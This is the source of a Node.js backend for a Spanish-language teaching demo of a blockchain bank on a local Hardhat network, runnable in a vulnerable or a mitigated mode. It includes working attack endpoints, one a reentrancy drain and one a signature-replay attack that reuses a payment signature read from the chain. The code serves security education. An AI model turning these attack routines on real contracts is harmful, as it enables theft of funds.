// Backend del Banco: el mismo código sirve para la versión vulnerable y la mitigada.
// Detecta el esquema de firma por el ABI del contrato desplegado (EIP-191 simple vs EIP-712).
const express = require("express");
const fs = require("fs");
const path = require("path");
const { ethers } = require("ethers");
const { cifrar, descifrar, hashComprobante } = require("./cripto");

const RPC_URL = process.env.RPC_URL || "http://127.0.0.1:8545";
const MODO = process.env.MODO || "vulnerable";
const PORT = process.env.PORT || 3000;
const DEPLOYED = process.env.DEPLOYED || "/shared/deployed.json";
const DIR_DATOS = process.env.DIR_DATOS || "/data";

// Cuentas de prueba de Hardhat. Las llaves privadas se derivan del mnemónico público de Hardhat
// (BIP-39 -> BIP-32, ruta m/44'/60'/0'/0/i). Cada transacción se firma aquí con ECDSA secp256k1.
const MNEMONICO = "test test test test test test test test test test test junk";
const INDICES = { victima1: 1, victima2: 2, victima3: 3, atacante: 9 };

// cacheTimeout -1: sin caché, para que cada transacción consulte el nonce real de la cuenta
const provider = new ethers.JsonRpcProvider(RPC_URL, undefined, { cacheTimeout: -1 });
const billeteras = Object.fromEntries(
  Object.entries(INDICES).map(([n, i]) => [n, ethers.HDNodeWallet.fromPhrase(MNEMONICO, "", `m/44'/60'/0'/0/${i}`).connect(provider)])
);

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const eth = (wei) => ethers.formatEther(wei);

// ---------- utilidades ----------
function leerDeploy() {
  if (!fs.existsSync(DEPLOYED)) throw new Error("El contrato todavía no está desplegado, espera unos segundos");
  return JSON.parse(fs.readFileSync(DEPLOYED, "utf8"));
}

function banco(runner) {
  const d = leerDeploy();
  return new ethers.Contract(d.banco.address, d.banco.abi, runner || provider);
}

function usaEIP712(b) {
  return b.interface.getFunction("pagarConFirma").inputs.length === 5;
}

function billetera(nombre) {
  if (!billeteras[nombre]) throw new Error(`Cuenta desconocida: ${nombre}`);
  return billeteras[nombre];
}

function nombreDe(direccion) {
  const e = Object.entries(billeteras).find(([, w]) => w.address.toLowerCase() === direccion.toLowerCase());
  return e ? e[0] : direccion;
}

function motivo(e) {
  return e.reason || (e.revert && e.revert.name) || e.shortMessage || e.message;
}

// "Base de datos" fuera de la cadena: un archivo por despliegue del contrato
function archivoDatos() {
  return path.join(DIR_DATOS, `comprobantes-${leerDeploy().idDespliegue || "sin-id"}.json`);
}

function leerComprobantes() {
  try { return JSON.parse(fs.readFileSync(archivoDatos(), "utf8")); } catch { return {}; }
}

function guardarComprobantes(datos) {
  fs.mkdirSync(DIR_DATOS, { recursive: true });
  fs.writeFileSync(archivoDatos(), JSON.stringify(datos, null, 2));
}

const ruta = (fn) => async (req, res) => {
  try { res.json(await fn(req)); }
  catch (e) { res.status(400).json({ error: motivo(e) }); }
};

// ---------- información ----------
app.get("/info", (req, res) => res.json({ modo: MODO }));

// Dirección + ABI para los scripts de ataque del compañero
app.get("/contrato", ruta(async () => {
  const d = leerDeploy();
  const { chainId } = await provider.getNetwork();
  return { modo: MODO, chainId: Number(chainId), banco: d.banco, atacante: d.atacante };
}));

app.get("/estado", ruta(async () => {
  const d = leerDeploy();
  const b = banco();
  const eip712 = usaEIP712(b);
  const cuentas = {};
  for (const [nombre, w] of Object.entries(billeteras)) {
    cuentas[nombre] = {
      direccion: w.address,
      billetera: eth(await provider.getBalance(w.address)),
      saldoEnBanco: eth(await b.saldos(w.address)),
      ...(eip712 ? { nonce: Number(await b.nonces(w.address)) } : {})
    };
  }
  return {
    modo: MODO,
    banco: d.banco.address,
    balanceBanco: eth(await b.balanceContrato()),
    totalOperaciones: Number(await b.totalOperaciones()),
    esquemaFirma: eip712 ? "EIP-712 (dominio + nonce + deadline)" : "EIP-191 personal_sign (sin nonce ni dominio)",
    cuentas
  };
}));

// ---------- depósitos con comprobante cifrado ----------
app.post("/depositar", ruta(async (req) => {
  const { cuenta, monto = "1", nota } = req.body;
  const w = billetera(cuenta);
  let comprobante = null;
  let hash = ethers.ZeroHash;

  if (nota && String(nota).trim()) {
    comprobante = cifrar(String(nota), w.address);   // AES-256-GCM fuera de la cadena
    hash = hashComprobante(comprobante);             // Keccak-256 -> a la cadena
  }

  const b = banco(w);
  const tx = await b.depositar(hash, { value: ethers.parseEther(String(monto)) });
  const recibo = await tx.wait();
  const evento = recibo.logs.map((l) => { try { return b.interface.parseLog(l); } catch { return null; } })
    .find((l) => l && l.name === "Deposito");
  const idOperacion = evento.args.idOperacion;

  if (comprobante) {
    const datos = leerComprobantes();
    datos[idOperacion] = { cuenta, direccion: w.address, monto: String(monto), ...comprobante, hashComprobante: hash, fecha: new Date().toISOString() };
    guardarComprobantes(datos);
  }

  return {
    ok: true,
    mensaje: `${cuenta} depositó ${monto} ETH`,
    idOperacion,
    hashComprobante: hash,
    comprobanteCifrado: comprobante,
    tx: tx.hash
  };
}));

// Verifica integridad (Keccak en la cadena vs. hash local) y autenticidad (tag GCM) y descifra
async function verificarComprobante(id, c) {
  const enCadena = await banco().operaciones(id);
  const hashLocal = hashComprobante(c);
  const integridad = enCadena.hashComprobante === hashLocal;
  let texto = null;
  let autenticado = false;
  let errorDescifrado = null;
  try { texto = descifrar(c, c.direccion); autenticado = true; }
  catch { errorDescifrado = "Tag de autenticación GCM inválido: el texto cifrado fue modificado"; }
  return {
    idOperacion: id, cuenta: c.cuenta, monto: c.monto, fecha: c.fecha,
    iv: c.iv, cifrado: c.cifrado, tag: c.tag,
    hashEnCadena: enCadena.hashComprobante, hashCalculado: hashLocal,
    integridad, autenticado, texto, errorDescifrado
  };
}

app.get("/operaciones", ruta(async () => {
  const datos = leerComprobantes();
  const lista = [];
  for (const [id, c] of Object.entries(datos)) lista.push(await verificarComprobante(id, c));
  return lista.reverse();
}));

app.get("/comprobante/:id", ruta(async (req) => {
  const c = leerComprobantes()[req.params.id];
  if (!c) throw new Error("Comprobante no encontrado");
  return verificarComprobante(req.params.id, c);
}));

// Demostración: alguien con acceso a la base de datos modifica un byte del texto cifrado
app.post("/comprobante/:id/alterar", ruta(async (req) => {
  const datos = leerComprobantes();
  const c = datos[req.params.id];
  if (!c) throw new Error("Comprobante no encontrado");
  const bytes = Buffer.from(c.cifrado, "hex");
  bytes[0] ^= 0x01;
  c.cifrado = bytes.toString("hex");
  guardarComprobantes(datos);
  return { ok: true, mensaje: "Se cambió 1 bit del texto cifrado en la base de datos fuera de la cadena" };
}));

// ---------- retiro normal ----------
app.post("/retirar", ruta(async (req) => {
  const { cuenta } = req.body;
  const tx = await banco(billetera(cuenta)).retirar();
  await tx.wait();
  return { ok: true, mensaje: `${cuenta} retiró su saldo`, tx: tx.hash };
}));

// Recarga el banco para repetir el ataque sin reiniciar Docker (solo demo).
// Cada víctima deposita 10 ETH para reponer el ETH real del contrato (tras la reentrancy
// el banco queda insolvente: los saldos siguen altos pero el contrato no tiene fondos).
app.post("/recargar", ruta(async () => {
  const detalle = [];
  for (const nombre of ["victima1", "victima2", "victima3"]) {
    const w = billetera(nombre);
    await (await banco(w).depositar(ethers.ZeroHash, { value: ethers.parseEther("10") })).wait();
    detalle.push(`${nombre} +10 ETH`);
  }
  return { ok: true, mensaje: `Banco recargado: ${eth(await banco().balanceContrato())} ETH`, detalle };
}));

// ---------- pago firmado (legítimo) ----------
// El titular firma fuera de la cadena; el destinatario envía la transacción (el titular no paga gas)
app.post("/pago-firmado", ruta(async (req) => {
  const { cuenta = "victima1", destinatario = "atacante", monto = "1" } = req.body;
  const titular = billetera(cuenta);
  const dest = billetera(destinatario);
  const valor = ethers.parseEther(String(monto));
  const b = banco(dest);

  let firma, detalle, tx;
  if (usaEIP712(b)) {
    const { chainId } = await provider.getNetwork();
    const domain = { name: "BancoCripto", version: "1", chainId, verifyingContract: await b.getAddress() };
    const types = { Pago: [
      { name: "titular", type: "address" }, { name: "destinatario", type: "address" },
      { name: "monto", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }
    ] };
    const nonce = await b.nonces(titular.address);
    const deadline = (await provider.getBlock("latest")).timestamp + 3600;
    const mensaje = { titular: titular.address, destinatario: dest.address, monto: valor, nonce, deadline };
    firma = await titular.signTypedData(domain, types, mensaje);
    detalle = {
      esquema: "EIP-712",
      dominio: { ...domain, chainId: Number(chainId) },
      datosFirmados: { ...mensaje, monto: String(monto) + " ETH", nonce: Number(nonce), deadline: Number(deadline) },
      digest: ethers.TypedDataEncoder.hash(domain, types, mensaje)
    };
    tx = await b.pagarConFirma(titular.address, dest.address, valor, deadline, firma);
  } else {
    const hashMensaje = ethers.solidityPackedKeccak256(["address", "address", "uint256"], [titular.address, dest.address, valor]);
    firma = await titular.signMessage(ethers.getBytes(hashMensaje));
    detalle = {
      esquema: "EIP-191 personal_sign",
      datosFirmados: { titular: titular.address, destinatario: dest.address, monto: String(monto) + " ETH" },
      hashMensaje,
      digest: ethers.hashMessage(ethers.getBytes(hashMensaje))
    };
    tx = await b.pagarConFirma(titular.address, dest.address, valor, firma);
  }
  await tx.wait();

  const sig = ethers.Signature.from(firma);
  return {
    ok: true,
    mensaje: `${cuenta} firmó un pago de ${monto} ETH a ${destinatario} y ${destinatario} lo cobró`,
    firma, r: sig.r, s: sig.s, v: sig.v,
    ...detalle,
    tx: tx.hash
  };
}));

// ---------- ATAQUE 1: reentrancy ----------
app.post("/atacar", ruta(async () => {
  const d = leerDeploy();
  const b = banco();
  const w = billetera("atacante");
  const antes = await b.balanceContrato();

  const fabrica = new ethers.ContractFactory(d.atacante.abi, d.atacante.bytecode, w);
  const atacante = await fabrica.deploy(d.banco.address);
  await atacante.waitForDeployment();
  const dirAtacante = await atacante.getAddress();

  let exito = false;
  let error = null;
  let reentradas = [];
  try {
    const tx = await atacante.atacar({ value: ethers.parseEther("1"), gasLimit: 3_000_000 });
    const recibo = await tx.wait();
    reentradas = recibo.logs
      .map((l) => { try { return atacante.interface.parseLog(l); } catch { return null; } })
      .filter((l) => l && l.name === "Reentrada")
      .map((l) => ({ numero: Number(l.args.numero), balanceBanco: eth(l.args.balanceBanco) }));
    exito = true;
  } catch (e) {
    try {
      await atacante.atacar.staticCall({ value: ethers.parseEther("1"), gasLimit: 3_000_000 });
      error = motivo(e);
    } catch (e2) {
      error = motivo(e2);
    }
  }

  const despues = await b.balanceContrato();
  const botin = await provider.getBalance(dirAtacante);
  if (botin > 0n) await (await atacante.retirarBotin()).wait();

  const robo = exito && despues < antes;
  return {
    modo: MODO,
    exito: robo,
    balanceBancoAntes: eth(antes),
    balanceBancoDespues: eth(despues),
    robado: eth(botin > ethers.parseEther("1") ? botin - ethers.parseEther("1") : 0n),
    reentradas,
    contratoAtacante: dirAtacante,
    mensaje: robo
      ? `Ataque exitoso: ${reentradas.length} reentradas, el banco pasó de ${eth(antes)} a ${eth(despues)} ETH`
      : `Ataque bloqueado: el banco sigue con ${eth(despues)} ETH`,
    error
  };
}));

// ---------- ATAQUE 2: replay de firmas ----------
// El atacante lee de la blockchain la última transacción pagarConFirma (los datos son públicos),
// extrae la firma y la vuelve a enviar.
app.post("/ataque-replay", ruta(async (req) => {
  const veces = Math.min(Math.max(parseInt(req.body.veces || 3, 10), 1), 10);
  const w = billetera("atacante");
  const b = banco(w);

  const eventos = await b.queryFilter(b.filters.PagoFirmado(), 0);
  if (!eventos.length) throw new Error("No hay pagos firmados en la cadena. Primero haz un pago firmado legítimo.");
  const ultimo = eventos[eventos.length - 1];
  const txOriginal = await provider.getTransaction(ultimo.transactionHash);
  const decodificada = b.interface.parseTransaction({ data: txOriginal.data, value: txOriginal.value });
  const args = [...decodificada.args];
  const titular = args[0];
  const firma = args[args.length - 1];

  const saldoAntes = await b.saldos(titular);
  const intentos = [];
  for (let i = 1; i <= veces; i++) {
    try {
      const tx = await b.pagarConFirma(...args);
      await tx.wait();
      intentos.push({ intento: i, ok: true, saldoTitular: eth(await b.saldos(titular)), tx: tx.hash });
    } catch (e) {
      intentos.push({ intento: i, ok: false, error: motivo(e), saldoTitular: eth(await b.saldos(titular)) });
    }
  }
  const saldoDespues = await b.saldos(titular);
  const exitosos = intentos.filter((x) => x.ok).length;

  return {
    modo: MODO,
    exito: exitosos > 0,
    titular: nombreDe(titular),
    firmaReutilizada: firma,
    txOriginal: ultimo.transactionHash,
    saldoTitularAntes: eth(saldoAntes),
    saldoTitularDespues: eth(saldoDespues),
    intentos,
    mensaje: exitosos > 0
      ? `Replay exitoso: la misma firma se cobró ${exitosos} ${exitosos === 1 ? "vez" : "veces"} más; ${nombreDe(titular)} perdió ${eth(saldoAntes - saldoDespues)} ETH`
      : intentos.some((x) => x.error === "Firma invalida")
        ? `Replay bloqueado: la firma ya fue usada (nonce) y ${nombreDe(titular)} conserva ${eth(saldoDespues)} ETH`
        : `Replay sin éxito: ${intentos[0].error}`
  };
}));

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Backend [${MODO}] escuchando en el puerto ${PORT}, nodo: ${RPC_URL}`);
});
